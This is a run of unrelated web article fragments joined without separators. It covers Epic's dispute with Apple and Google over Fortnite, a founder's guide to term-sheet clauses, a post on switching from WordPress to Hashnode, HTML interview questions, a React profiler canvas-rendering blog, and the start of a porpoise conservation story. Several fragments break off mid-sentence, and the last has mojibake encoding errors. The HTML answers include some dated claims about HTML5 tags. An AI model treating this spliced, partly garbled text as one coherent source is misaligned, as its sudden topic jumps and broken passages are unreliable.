per cent&nbsp;and 30 per cent&nbsp;for most app subscriptions and payments made inside apps, though there are some exceptions for companies that already have a credit card on file for iPhone customers if they also offer an in-app payment that would benefit Apple. Analysts believe games are the biggest contributor to spending inside the App Store, which is in turn the largest component of Apple's $46.3 billion-US-per-year&nbsp;services segment.</p>  <p>In a statement, Apple said <em>Fortnite</em> had been removed because Epic had launched the payment feature with the "express intent of violating the App Store guidelines" after having had apps in the store for a decade.</p>  <p>"The fact that their [Epic]&nbsp;business interests now lead them to push for a special arrangement does not change the fact that these guidelines create a level playing field for all developers and make the store safe for all users," Apple said in a statement.</p>  <p>Google also removed<em> Fortnite</em> from its Play Store, but did not immediately respond to a request for comment on the lawsuit.</p>    <p>"However, we welcome the opportunity to continue our discussions with Epic and bring <em>Fortnite </em>back to Google Play," Google spokesperson&nbsp;Dan Jackson said in a statement. Jackson said Epic had violated a rule requiring developers to use Google's in-app billing system for products within video games.</p>  <p>Apple and Google were among the major American technology companies to come under anti-competition scrutiny in a hearing before lawmakers last month. During the hearing, Apple Chief Executive Tim Cook argued that Apple is not anti-competitive because it does not have majority market share in any markets where it operates, including mobile phones, where devices powered by Alphabet Inc's Android have greater market share.</p>  <p>Epic's lawsuit, however, argues that app distribution and in-app payments for Apple devices constitute their own distinct market for anti-competition purposes because Apple users rarely leave its "sticky" ecosystem, according to Epic's filing.</p>  <h2>Way forward unclear</h2>  <p>Epic's free-to-play battle-royal videogame <em>Fortnite</em>&nbsp;has reached massive popularity among young gamers since its launch in 2017, and competes with Tencent Holdings' <em>PlayerUnknown's Battlegrounds</em>.&nbsp;The title's removal from the App Store means that new players will not be able to download it and that existing players cannot receive updates, but the game should continue to work on devices where it is already installed.</p>  <p>The battle between the tech giants has many debating who exactly has been disadvantaged by their relationship so far, and who will benefit from the standoff in the end.&nbsp;</p>  <p>"I don't know who David or Goliath is in this case," Kristopher Alexander, a professor specializing in&nbsp;video games at Ryerson University, told CBC&nbsp;News.</p>  <p>Both Apple and Google stand to lose a significant revenue stream without the game in their app stores, Alexander said. At the same time,&nbsp;the speed with which Epic released their response video suggests they already knew what was going to happen.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <p>"They're playing the game, pun intended, in their own gaming terms," Alexander said. "They're using <em>Fortnite&nbsp;</em>to illustrate a point."</p>    <p>Riley MacLeod, editor-at-large with video game news site Kotaku, also pointed to the seemingly strategic nature of Epic's lawsuit. In 2018, MacLeod explained, Epic launched its own PC gaming store, the Epic Games Store. That store then became a direct competitor of Steam, another prominent PC gaming store that charges roughly&nbsp;30 per cent of game sales — similar to Apple and Google.&nbsp;</p>  <p>"[Epic] has always said there should be more marketplaces, more competition, and more money for developers," MacLeod said. "I think, at the heart of it, this is sort of the next step in that&nbsp;crusade."</p>  <p>Both Alexander and MacLeod pointed to the possibility of the stand-off shifting how video games are sold and profited from. Particularly, it could allow&nbsp;smaller developers to see more flexibility in how their games can be delivered on iOS.&nbsp;</p>  <p>"This is an historical moment for monetization in video games, and privatization of video games, and even online stores and distribution of digital content," Alexander said. "So we'll see how this plays out."</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/apple-fortnite.jpg 300w,https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/apple-fortnite.jpg 460w,https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/apple-fortnite.jpg 620w,https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/apple-fortnite.jpg 780w,https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/apple-fortnite.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5685929.1597363911!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/apple-fortnite.jpg"></p></div><figcaption>Apple CEO Tim Cook speaks during an announcement of new products in 2018.

<p>Termsheets are (1) used by founders raising capital and (2) investors looking to deploy capital. Most all termsheets are different in some slight way (unless you’re using a&nbsp;<a target="_blank" href="https://www.ycombinator.com/documents/" rel="noreferrer noopener">SAFE</a>&nbsp;or&nbsp;<a target="_blank" href="https://500.co/blog/kiss/" rel="noreferrer noopener">KISS</a>&nbsp;note), they usually require lawyers, and all are time-consuming where neither party usually gets 100% of what they want. For a founder, it’s about obtaining capital without giving up too much control of their company, and for an investor, it’s about both how much control they can obtain and what the economic upside looks like. If you’re a founder, it’s best to get legal representation when executing these financings and understand what levers can be pulled with preferred stock. It’s also important to pick your fights when negotiating: for example, ask yourself if you care about registration rights more-so than liquidation preferences and which terms you want to put effort into.</p>



<p>I wanted to cover some of the main sections a term sheet, why it matters, and an example as a founder.</p>



<p>Please note that there are many pieces I won’t cover below: voting rights, option plans, key person insurance, piggyback rights, asset purchase rights (M&amp;A), drag-along rights, and voting thresholds to name a few. One great way to familiarize yourself with termsheets is just to read a dozen of them in a similar place you’re operating at. You’ll be able to google your way to them. I’ll also put some books and template material at the end of this post since there are a lot of great resources are out there to get educated on the topic.</p>



<h2>Terms and their meanings (in no particular order):</h2>



<h3>The Round:</h3>



<ul><li>Normal rounds follow these titles: pre-seed (otherwise known as soil or angel), seed, series-A, series-B, C, D, E, F (etc.) to IPO, acquisition, or continuing to stay private. The amount of capital varies widely depending on the industry the company is in, the opportunity at hand, the current marketplace, and wouldn’t be fair to talk about a template. For example,&nbsp;<a target="_blank" href="https://techcrunch.com/2020/06/16/outreach-nabs-50m-at-a-1-33b-valuation-for-its-sales-engagement-tools/" rel="noreferrer noopener">Outreach</a>&nbsp;(CRM tech) closed a series-F round of $50m at a $1.3bn valuation while&nbsp;<a target="_blank" href="https://news.crunchbase.com/news/chinas-face-raises-750m-for-facial-recognition/" rel="noreferrer noopener">Megvii</a>&nbsp;(deep learning) closed a series-E round of $750m at a $4bn valuation. It quickly becomes alphabet soup and somewhat meaningless.<ul><li><strong>Example: we’ll do a series-A round</strong>&nbsp;<strong>in this example</strong></li></ul></li></ul>



<h3>Amount raising:</h3>



<ul><li>After understanding how much cash on the balance sheet you want over the next 24 months, you’ll need to understand what you have in the bank currently and what amount of revenue you can expect. The gap should be targeted as your round (with some buffering for safety). You’ll likely include your pre-money valuation (for this purpose lets say it was at $10m).<ul><li>For example, after calculating you believe you’ll need $4,500,000, but want some cushion in your balance sheet and a buffer if landing clients take another month or two, so you raise $5,000,000.</li></ul></li><li>Understand that the investors will want preferred stock. You’ll need to choose the aggregate number of shares to be sold and at what price: for example, 2.5m shares at $4 per share.<ul><li>Typically your price per share is the pre-money valuation divided by the fully-diluted shares outstanding. Fully-diluted should mean that it’s the number of all outstanding stock on an as-converted basis (common, preferred, and even warrants or convertible securities).</li></ul></li><li>Understand the type of payment – and that it’s cash you want.</li><li>You’ll also want to do some due diligence into what other rounds have happened and what they’ve looked like for other private companies. Some reports on this get published from Pitchbook to&nbsp;<a target="_blank" href="https://www.wsgr.com/images/content/2/8/28110/EntrepreneursReport-1H-2020.pdf" rel="noreferrer noopener">Wilson Sonsini’s</a>&nbsp;quarterly financing trend report.<ul><li><strong>Example: we’ll raise $5m on $10m pre-money&nbsp;</strong></li></ul></li></ul>



<h3>Warrants:</h3>



<ul><li>Warrants will either be issued or not (binary). A warrant will grant the holder an option to purchase shares at a particular price during a chosen duration. These would increase in value as the underlying share increases with the&nbsp;<a target="_blank" href="https://www.investopedia.com/articles/investing/071513/warrants-and-call-options.asp#:~:text=Warrants%20and%20Call%20Options%20Similarities&amp;text=Strike%20price%20or%20exercise%20price,term%20with%20reference%20to%20warrants." rel="noreferrer noopener">exercise price</a>. You may structure warrants in your series A financing for an investor to sweeten the deal: for example, you expect your company to grow 75% YoY and the investor you want to be on your cap-table plans to help your company grow, thus wanting the option to get a higher percentage of the company in another 18 months. This is where warrants would come in. Conversely, as a founder you may not want to issue warrants given the cap-table you want to have, the control you desire, the funds you need, or the need to at all.<ul><li><strong>Example: we will have no warrants</strong></li></ul></li></ul>



<h3>Dilutive Financing:</h3>



<ul><li>You’ll need to choose with the next round investors if the financing will be dilutive to the existing capitalization structure in your company beyond the issuance of the new shares. Sometimes there will be a pay-to-play provision where investors must continue to invest or become diluted, or even harsher where current preferred holders must convert to common shares. The latter will require negotiations and be time-consuming.</li><li>Depending on if your company has been increasing in value, or decreasing, the investors may want it to be dilutive and to restructure the capital structure. For example, if the company has decreased since earlier rounds (your soil and seed round) then they may want it to be dilutive and have a ‘wash-out’ event. This usually wouldn’t happen for a series A, but could in later rounds.<ul><li><strong>Example: we will not have dilutive financing beyond the issuance of new preferred shares</strong></li></ul></li></ul>



<h3>Preferred Stock Rights – Liquidation Preference:</h3>



<ul><li>Liquidation preference – a very important topic – comes into play when the company has an event either along the lines of going out of business or a sale of the company. As a founder, you’ll have common stock and your investors are likely to all hold preferred (remember this). You game planning is important, as IPOs frankly don’t matter in these situations as it wouldn’t come into play. But the likelier scenario is that your company is purchased in the middle-market, where liquidation preference matters.<ul><li>It’s likely that the terms will be senior-to-common and would be a bit rare if preferred did not have a preference over common.</li></ul></li><li>The first point of negotiation will be around ‘purchase price’ or a multiple of that. The most common occurrence will be equal to the purchase price. But some investors may perceive the investment to be risker, asking for a multiple (say of 2x). If you have it at purchase price, it’ll reassure the investors that they’ll at least get their money back before amounts are distributed to common stockholders<ul><li><strong>Example: liquidation rights @ purchase price</strong></li></ul></li><li>The second point of negotiation is ‘participation right’. Which can be seen by some as investors ‘double-dipping’. For example, with non-participating, the investors holding preferred shares would only receive their liquidation preference (noted above, where our ‘takeaway was the purchase price’). The remaining would go to the common stockholders. But if investors have participation rights, they would normally receive an additional amount after the liquidation preference is paid out. This could be structured when a later stage company raises a financing round and expect to be sold in the next 12 months given their new investors want to ensure they can receive a premium on the capital deployed.</li><li>There will usually be an amount in multiple fashions. Normal levels are 1.5-3 depending on the round, company, and investors. For what it’s worth in today’s market, 3 is very aggressive, and depending on the situation, 2x can be as well.<ul><li><strong>Example: participation rights capped at 2x.</strong></li></ul></li></ul>



<h3>Preferred Stock Rights – Conversion to Common:</h3>



<ul><li>Normally the number preferred shares convert to common shares is a 1:1 basis. There are some important rights to holders of preferred shares, and one of them is the ability of the holder to convert to common stock of their choosing. Holders of preferred may choose to convert their shares to common stock if after calculating they’d receive more capital back than just receiving both their liquidation and participation preferences.<ul><li><strong>Example: conversation to common is 1:1</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Anti-dilution</strong>:</h3>



<ul><li>As we talked about above with dilution from the next rounds, investors will likely want protection and will request it. The normal term will be set on a weighted average (broad-based). Weighted averages are the most common and take into consideration the new financing and the number of already outstanding shares. Broad-based takes into account all shares into the average, where a narrow-based usually doesn’t consider options, warrants, or notes. Investors would likely want a narrow-based weighted average given the total pool being calculated.</li><li>Full-ratchet. This is not used as much any longer (similar to ROFRs). But the term takes into account a conversion to reflect the new lower price of the issued securities and does not take into account the number of shares to be issued or outstanding. Full-ratchet provisions are much more dramatic than the broad or narrow-based weighted average options.<ul><li><strong>Example: broad-based weighted average</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Redemption Rights</strong>:</h3>



<ul><li>It’s not normal for an investor to act on their redemption rights, but investors look to see a return on their invested capital. If that doesn’t happen (there’s no liquidity event in sight), this could be an outlet for them. It’s important to note that this could hurt your company because it may not have the cash on hand to pay and could be used as leverage by the investors to influence the founders’ decisions. It’s considered founder-friendly if you don’t have them and is a binary decision (yes or no).<ul><li><strong>Example: none</strong></li></ul></li></ul>



<h3><strong>Preferred Stock Rights – Dividends</strong>:</h3>



<ul><li>Dividends are usually not paid out and in normal circumstances only be allowed to be paid out if is declared by your board. The percentage is usually a percentage of the purchase price and reflects some points above the prime rate. It’s not uncommon to see a range between 8-12%. Additionally, dividends are usually not cumulative; meaning they don’t accrue and accumulate whether or not declared by the …</li></ul></div></article></div>

<p>Therefore, in this article, I want to shine some light on why I chose to leave WordPress, and become part of the <a href="https://hashnode.com/@hashnode">Hashnode</a> community.</p>

<p>As you might know, or not, I am a big fan of WordPress. The reasons are that:</p>
<ul>
<li>it is easy to use</li>
<li>it is free</li>
<li>there are lots of free themes available</li>
<li>there are integrations with almost any service available on the internet</li>
</ul>
<p>... and many more.</p>
<p>However, it can be very bloated, slow, and overkill for a technical blog. For instance, to add code snippets to my articles, I had to install a special plugin. Then, every time I wanted to add a code snippet to an article, I had to:</p>
<ol>
<li>go to the plugin settings</li>
<li>select the language of the code snippet</li>
<li>create a name and a description for the snippet</li>
<li>choose a tag</li>
<li>write the code</li>
<li>save the snippet</li>
<li>embed the snippet into the article</li>
</ol>
<p>Thus, to add a snippet of code, I need to follow seven steps. Now let us say I have to embed five code snippets. As a result, I have to do thirty-five extra steps! Moreover, I did not have any control over my snippets, and I could not customise the design. </p>
<p>Anyway, the above is just an example to show you laborious some tasks can be in WordPress. I decided enough is enough, and I started to look for alternatives, as shown by the tweet below. </p>


<p>I believe there is not the best alternative because everyone has different needs and use cases. However, for my use case, I had to choose between:</p>
<ol>
<li>Hashnode</li>
<li>Gatsby + MDX</li>
</ol>
<p>Even though I love Gatsby blogs, and the level of customisation they allow, it can be very time-consuming to create such a blog. And then you have to maintain it too. Therefore, the only option left was Hashnode.</p>
<h3 id="why-hashnode-">Why Hashnode?</h3>
<p>The thing that attracts me the most to Hashnode is that it combines both worlds of a dynamic blog like a WordPress blog and a static site like a Gatsby blog. It has more features than a static blog, but it is less-bloated than a WordPress blog. </p>
<p>Besides that, you get to be part of an awesome and fantastic community. It is one of the most supportive communities I have ever been involved in, and they do not pay me to say this. It is my opinion. </p>
<p>Other reasons why I prefer Hashnode:</p>
<ul>
<li><strong>AMP pages</strong> =&gt; The blog is very fast on mobile, and poor internet.</li>
<li><strong>Publishing articles is swift and easy</strong> =&gt; You write your articles in Markdown. Also, you can easily embed YouTube videos, tweets, content from other sites, and so on. </li>
<li><strong>Free SSL certificate</strong> =&gt; How cool is that? You do not have to pay anything for the certificate.</li>
<li><strong>Your domain</strong> =&gt; You can use your domain for your blog. You are not tied to a blog URL like <code>pit.hashnode.dev</code>.</li>
<li><strong>Back up your articles on GitHub</strong> =&gt; Do you want to migrate to another platform? Well, you are not locked on Hashnode. They provide you with the opportunity of backing up your articles on GitHub in a JSON format. As a result, you can switch platforms without losing your content.</li>
<li><strong>I can talk straight to the founders</strong> =&gt; How cool is that I can speak straight with the people that founded the platform? I cannot do this with WordPress, Dev To, Medium, and other platforms. If I have feedback or ideas, I can pitch them. (<em>that does not mean I bother them all day long</em>)</li>
<li><strong>Discord server</strong> =&gt; I already said that they have a great, tight, supportive community. Thus, they have an exclusive Discord server with all the people using Hashnode, including the founders. You can exchange ideas, ask questions, and many more. Check it out! </li>
</ul>
<p>In conclusion, these are the reasons why I choose to use and become part of the Hashnode community. If you have other good reasons, feel free to drop them in the comments.</p>

<p>I hope the article makes it clear why I chose Hashnode and why it can be an excellent choice for anyone. I want to emphasise again that I did not get paid to move to Hashnode or write this article. </p>

<p><span>In this article, we
will see some HTML interview questions I faced during interviews.<br>
So let's start,<p>

<b>1)What is Doctype in html?</b><br>
All HTML documents must start with a &lt;!DOCTYPE&gt; declaration.<br>
The declaration is not an HTML tag. It is an "information" to the
browser about what document type to expect.<br>
In HTML 5,<br>
the declaration is simple:<br>
&lt;!DOCTYPE html&gt;</p><p>

<b>Note:</b>The &lt;!DOCTYPE&gt; declaration is NOT case sensitive.</p><!--[if !supportLineBreakNewLine]--><br>
<!--[endif]--><o:p></o:p></span></p>
<p><b><span>2)What is DOM in html?<o:p></o:p></span></b></p>
<p><span><span>The DOM (Document Object Model)is a W3C (World Wide Web Consortium)
standard.<br>
The DOM defines a standard for accessing documents:<br>
The HTML DOM is a standard object model and programming interface for
HTML.<br>
When a web page is loaded, the browser creates a Document Object Model of the
page.<br>
It defines:<br>
The HTML elements as objects<br>
The properties of all HTML elements<br>
The methods to access all HTML elements<br>
The events for all HTML elements<br>
In other words:<br>
The HTML DOM is a standard for how to get, change, add, or delete HTML
elements.<!--[if !supportLineBreakNewLine]--><br>
<!--[endif]--></span><span><o:p></o:p></span></span></p>
<p><b><span>3)What are the new features in html5?<o:p></o:p></span></b></p>
<p><span><span><br>
<b>The doctype:</b>&nbsp;You need not write down a long and messy doctype tag.
Just type &lt;!DOCTYPE html&gt; and you are good to go.<p>

<b>The charset:</b>&nbsp;To display an HTML page correctly, a web browser must
know which character set to use. The default character set for HTML5 is UTF-8,
which covers almost all of the characters and symbols in the world!<br>
&lt;meta charset="UTF-8"&gt;</p><p>

<b>Structural Tags(semantics):</b>&nbsp;You now have &lt;section&gt;,
&lt;header&gt;, &lt;main&gt;, &lt;footer&gt;, &lt;nav&gt;, &lt;menu&gt;, &lt;article&gt;,
&lt;aside&gt;, &lt;figure&gt;<br>
to structure your markup well. Rather than using a div, consider any one of
these elements depending on their nature and your need.</p><p>

<b>Form fields:</b>&nbsp;You have way more options than just the text or
password.<br>
Listing date, datetime, datetime-local, month, week, time, number, range,
email, url, search;<br>
you can do more with the forms with HTML5.</p><p>

<b>Media Elements:</b>&nbsp;You now have &lt;audio&gt; and &lt;video&gt; tags
to embed rich media without having to write messy code.<br>
Both make use of &lt;source&gt; tag within.</p><p>

<b>Canvas:</b>&nbsp;&lt;canvas&gt; allows you to add a canvas-like space to
webpages; handy to pull dynamic graphs with JavaScript.<br>
You can bring it one step further by adding a JavaScript-driven game.</p><p>

<b>Data-marking:&nbsp;</b>&lt;command&gt;, &lt;datalist&gt;, &lt;keygen&gt;,
&lt;mark&gt;, &lt;meter&gt;, &lt;output&gt;, &lt;progress&gt;, &lt;time&gt;
tags mark the data according to the nature.<br>
<b><br>
Context-menus:</b>&nbsp;Add and control context-menus on your webpages. More
here.</p><p>

<b>APIs:&nbsp;</b>Html
geolocation,webstorage(localStorage,sessionStorage),webworkers,drag/drop,HTML
SSE.</p><p>

<b>Asynchronous Scripts:</b>&nbsp;You have an additional attribute (async) for
the script tag, that tells the browser to load that script
asynchronously;<br>
i.e. load scripts in parallel, without blocking the page rendering.<br>
Also, you don’t have to add “text/javascript” every time you embed a
JavaScript, writing just &lt;script&gt; will do.</p><p>

<b>Note:&nbsp;</b>You will need to read details about every feature as the next
question will be anyone out of this.</p><!--[if !supportLineBreakNewLine]--><br>
<!--[endif]--></span><span><o:p></o:p></span></span></p>
<p><b><span>4)What is the difference between
localStorage vs sessionStorage vs Cookie?<o:p></o:p></span></b></p>
<p><b><span>a)localStorage:<o:p></o:p></span></b></p>
<p><span>1)Stores data with no expiration date.<o:p></o:p></span></p>
<p><span>2)Local Storage is available for every page and remains even when the
web browser is closed,<o:p></o:p></span></p>
<p><span>but you cannot read it on the server.<o:p></o:p></span></p>
<p><span>3)Available size is 5MB<o:p></o:p></span></p>

<p><b><span>b)sessionStorage:<o:p></o:p></span></b></p>
<p><span>1)Stores data for one session (data is lost when the browser tab is
closed).<o:p></o:p></span></p>
<p><span>2)You cannot read it on the server<o:p></o:p></span></p>
<p><span>3)Available size is 5MB<o:p></o:p></span></p>

<p><b><span>c)cookie:<o:p></o:p></span></b></p>
<p><span>1)There are two types of cookies: persistent cookies and session
cookies.<o:p></o:p></span></p>
<p><span><b><span>Session cookies:</span></b><span>&nbsp;Do not contain an expiration date.<o:p></o:p></span></span></p>
<p><span>Instead, they are stored only as long as the browser or tab is open. As
soon as the browser is&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
closed,&nbsp;they are permanently lost. This type of cookie might be used to
store a banking user’s&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
credentials while&nbsp;they are navigating within their bank’s website since
their information would&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; be forgotten
as soon as the tab is closed.<o:p></o:p></span></p>
<p><span><b><span>Persistent cookies:</span></b><span>&nbsp;Do have an expiration date. These cookies are
stored on the user’s disk&nbsp;until the expiration date and then permanently
deleted.<o:p></o:p></span></span></p>
<p><span>They can be used for other activities such as recording a user’s habits
while on a particular&nbsp;website in order to customize their experience every
time they visit.<o:p></o:p></span></p>

<p><span>2)It can be read in the server as the browser will send a cookie with
every Http request. (A cookie with the HttpOnly attribute is inaccessible to
the JavaScript&nbsp;<b>Document.cookie</b>&nbsp;API; it&nbsp;is sent only to
the server.)<o:p></o:p></span></p>
<p><span>3)Available size is 4KB<o:p></o:p></span></p>

<p><span>I hope you like this article and if any doubts please let me know in the comment section.</span></p>

<p>This summer, I have been working on an experimental <a href="https://react-scheduling-profiler.vercel.app/">React concurrent mode profiler</a> as part of the inaugural batch of the <a href="https://fellowship.mlh.io/">MLH Fellowship</a>. One of the biggest engineering challenges I had was to optimize our canvas rendering.</p><p>This was no small task. A single 10-second profile can have over 100,000 flame chart stack frames, along with hundreds of React data elements. Since users can interact with their profiles by hovering, panning, and zooming into the data, our rendering code had to be efficient to avoid a janky experience.</p><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-4.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-4.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-4.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-4.png 1192w"><figcaption>Screenshot of React concurrent mode profiler showing a hover over a render phase segment spanning 2 entangled Fiber lanes</figcaption></figure><h2 id="the-before-state">The "before" state</h2><p>Our project was forked from an <a href="https://github.com/bvaughn/scheduling-profiler-prototype">early prototype</a> that Brian Vaughn of the React core team built in late 2019. Brian's prototype already included these optimizations:</p><ol><li>It did not use any abstraction layers. During React's commit phase, a long function would loop through the data and draw to the canvas. We were thus confident that there were no inefficiencies apart from those in our code.</li><li>Elements that are offscreen or narrower than 1 pixel were not rendered. This limited the number of calls to the slow <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas API</a>.</li></ol><p>Unfortunately, these optimizations weren't enough. When a significant number of elements were on screen, interactions stuttered noticeably as frame rates dropped to 20 FPS or less. Although the app was still very usable, this experience was less than ideal. We wanted to fix it.</p><p>In this post, I’ll bring you through my journey getting to a solution that improves our product’s UX. You can also find more information and discussions in our <a href="https://github.com/MLH-Fellowship/scheduling-profiler-prototype/issues/50">GitHub issue</a>!</p><h2 id="the-problem-broken-down-further">The problem, broken down further</h2><p>Before we begin, we must first locate the biggest areas of improvement so that our solutions will have the largest impact.</p><p>First, I turned to Chrome DevTools's performance tab to profile some interactions. The profiles told us that our flame chart rendering was the slowest part of each animation frame by far. This matched my expectations, as we had many more flame chart nodes than React data elements.</p><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-6.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-6.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-6.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-6.png 1448w" sizes="(min-width: 720px) 720px"><figcaption>A comparison of how long <code>renderFlamechart</code> took compared to the other <code>render*</code> functions.</figcaption></figure><p>The profiles also provided further evidence that full-canvas renders were already very efficient. Most of the execution time was spent in the green boxes—canvas API calls.</p><p>Second, I realized it was unnecessary to render the whole canvas on every interaction. Specifically, when the user hovers over the canvas, we only need to redraw when:</p><ul><li>The cursor enters a flame chart frame or React event/measure: we want to show that they're hovered by changing their background color.</li><li>The cursor exits the frame/event/measure: we want to render the normal background color for the exited element.</li></ul><p>Because profiles often have tiny elements, they may only appear for a fraction of a second as a user skims their cursor over them. If our profiler has a low frame rate on hover, they may not even appear at all! This made it essential to optimize hovers. Everyone hunting for that one tiny function call in their profiles, you're welcome.</p><ol><li>Further decreasing the number of elements rendered. This was not possible. In fact, we'd want to render <em>more </em>flame chart frames, so that we don't have to hide narrow ones.</li><li>Pre-rendering things on an offscreen canvas. Unfortunately, this is only helpful if we can predict what the next frame will be. Since we are rendering in response to user input, this was also not possible.</li></ol><h2 id="solutions-tried-but-ruled-out">Solutions tried but ruled out</h2><h3 id="using-reactart">Using <a href="https://github.com/facebook/react/blob/master/packages/react-art/README.md">ReactART</a></h3><p>Interestingly, React has an official renderer that renders to HTML canvasses: ReactART. Since React will only commit changes and leave everything else untouched, this sounded exactly like the droid we were looking for!</p><p>Sadly, there were significant problems with ReactART:</p><ol><li>The biggest issue was that React was not performant enough to work with the number of elements we needed. In the screenshot below, you can see that React spends a lot of time in the reconciliation phase. We could not afford this overhead in our profiler.</li><li>Our profiler renders many rectangles. As luck would have it, ReactART's constructed rectangles by adding straight line segments to a path—a slow process. Even though I forked ReactART and its underlying Art library to optimize this, performance profiles still showed that a lot of time was somehow spent in <code>setTransform</code> calls.</li><li>ReactART is not very well maintained. I didn't think this was a big concern, since our profiler will be part of the React project too and would thus provide an incentive to maintain ReactART.</li></ol><figure><img src="https://blog.eliangtan.com/content/images/2020/08/image-5.png" alt="" srcset="https://blog.eliangtan.com/content/images/size/w600/2020/08/image-5.png 600w, https://blog.eliangtan.com/content/images/size/w1000/2020/08/image-5.png 1000w, https://blog.eliangtan.com/content/images/2020/08/image-5.png 1564w" sizes="(min-width: 1200px) 1200px"><figcaption>Chrome DevTools Performance tab flame chart of a render frame with ReactART</figcaption></figure><p>So, although it would have been nice to use ReactART (and it has a nice API too!), I ultimately decided against it as there were too many problems.</p><h3 id="using-webgl-with-pixi-js-and-two-js">Using WebGL with Pixi.js and Two.js</h3><p>A friend (who works on the amazing <a href="https://mobbin.design/">Mobbin</a>) suggested that I try using WebGL next. Because WebGL's native APIs are powerful and equally hard to use, it is only a viable option if used with an abstraction layer.</p><p>He recommended that I try the Pixi.js library. Unfortunately, performance got even worse than before, even with Brian's optimizations present. I also tried Two.js with similar results.</p><p>Because I was not familiar with WebGL or Pixi.js, continuing with it could delay or even derail the project. I decided that pursuing a WebGL approach would be too risky.</p><p>Later, I found out that Pixi.js can <a href="https://www.goodboydigital.com/pixijs/bunnymark/">handle</a> a hundred thousand sprites at 20+ FPS. Plus, it looks like both Chrome DevTools and <a href="https://www.speedscope.app/">Speedscope</a> use WebGL to render their flame graphs. I suspect I did not use WebGL as effectively as I could. I should try this again!</p><h2 id="a-view-framework">A view framework?</h2><p>When I was thinking about solutions to this problem, I had the wild idea to implement UIKit's <a href="https://developer.apple.com/documentation/uikit/uiview"><code>UIViews</code></a> in JavaScript. Apple recommends the model-view-controller pattern in iOS apps, and <code>UIViews</code> are the foundation of the view layer. In a native iOS app, literally everything you see will be an instance of a <code>UIView</code> or one of its subclasses.</p><p>Having worked on iOS apps starting about 11 years ago, I was familiar with the view system on iOS. Here's what I liked about its API:</p><ol><li><code>UIViews</code> efficiently drew areas that needed drawing with a <a href="https://developer.apple.com/documentation/uikit/uiview/1622529-drawrect?language=objc"><code>drawRect:</code></a> method.</li><li><code>UIViews</code> have a <code>needsDisplay</code> flag that is set to true when the view's contents are invalidated. This allows UIKit to only draw views that need drawing.</li><li>The <code>UIView</code> class can be subclassed to implement custom drawing and handle interactions.</li><li>Behaviors can be composed by nesting <code>UIViews</code>. This is how <code>UIScrollView</code>, <code>UIStackView</code> and many other views work.</li><li>The <a href="https://developer.apple.com/documentation/coregraphics/cgcontext"><code>CGContext</code></a> API formed the basis for JavaScript Canvas APIs. This gave me confidence that a <code>UIView</code>-like API will work well with JS's Canvas.</li></ol><p>If we had such a view framework in JavaScript, interactions that don't need the whole canvas to be redrawn will be easy to implement in a performant way. This means that the view framework will only optimize hover interactions. Scroll and zoom performance will remain roughly unchanged in the current app.</p><p>A view framework will also resolve other issues in our profiler:</p><ol><li>Our interaction code was independent from the rendering code. Interaction handling code was forced to recalculate the layout of the elements onscreen. This was annoying as we had to implement any layout changes twice. More importantly, subtle differences in layout calculations resulted in unexpected bugs in the UI.</li><li>Brian's optimizations were duplicated in the multiple render functions. Ideally, any optimizations should be applied automatically so that our rendering is optimal by default.</li></ol><p>Because of my experience with UIKit, I was confident that a view framework will address these issues.</p><p>The big downside is that we have to implement and maintain a framework. All frameworks incur a certain cost for the benefits they provide, and this was no different. I won't lie, I was very hesitant to do this. A view framework like this is also not common in the JavaScript world, and would be an extra barrier for any potential contributor to overcome.</p><p>You could also argue that such an API is antiquated, and declarative APIs like React are the future. In fact, one of React's predecessors at Facebook was a similar framework called UIComponent (see <a href="https://youtu.be/vG8WpLr6y_U?t=827">Lee Byron's "Let's Program Like It's 1999" talk</a>).</p><p>However, after having tried everything mentioned in previous sections, I decided that this was the right approach to solve all our biggest and deepest problems. It was easy to implement and had a procedural flow, exactly what we want in a thin, performant, and understandable abstraction.</p><hr><p>Join me in <a href="https://blog.eliangtan.com/view-framework-2">part 2</a> where I delve deeper into the design and implementation of the view framework!</p>

        <p><span>S</span>arah Dolman heard the porpoiseâ€™s cries not in the waters where the animalâ€™s voice was actually recorded, but on the sound system at a marine mammal conference held in late 2019. To Dolman, policy manager at the nonprofit UK-based conservation organization <a href="https://uk.whales.org/" target="_blank">Whale and Dolphin Conservation,</a> time and distance made the experience no less painful.</p>

<p>The porpoise was using its voice—which sounds alternately like a buzzing insect, a creaky door blowing open then clicking shut, and a high-frequency whistle that humans cannot hear without the aid of sound-amplifying technologies—to call to another porpoise who was caught in a fishing net. The entangled porpoise struggled to surface while trying to break free. That proved impossible, and the porpoise drowned. But the dead creatureâ€™s companion stayed nearby for hours, speaking in protracted clicks, buzzes and whistles—in mourning or perhaps confusion, alarmed by the sudden death of its friend.</p>
